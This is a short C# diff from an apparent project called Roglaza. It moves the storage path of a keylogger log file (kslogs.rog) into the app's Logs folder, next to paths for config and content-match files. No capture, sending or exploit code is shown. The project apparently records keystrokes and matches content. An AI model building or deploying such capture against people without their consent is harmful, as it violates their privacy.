@@ -41,7 +41,7 @@ namespace Roglaza
            matches_lists = new List<string>();
            GeneralSettingsFilePath = RoglazaInstaller.GetRoglazaAPPDataPath() + "\\config.rog";
            LogsPath = RoglazaInstaller.GetRoglazaAPPDataPath() + "\\Logs";
-           KeyLoggerStorePath = RoglazaInstaller.GetRoglazaAPPDataPath() + "\\kslogs.rog";
+           KeyLoggerStorePath = RoglazaInstaller.GetRoglazaAPPDataPath() + "\\Logs\\kslogs.rog";
            ContentMatchesPath = RoglazaInstaller.GetRoglazaAPPDataPath() + "\\matches.rog";
 
            if (RoglazaHelper.IsExistedFile(ContentMatchesPath) == false)
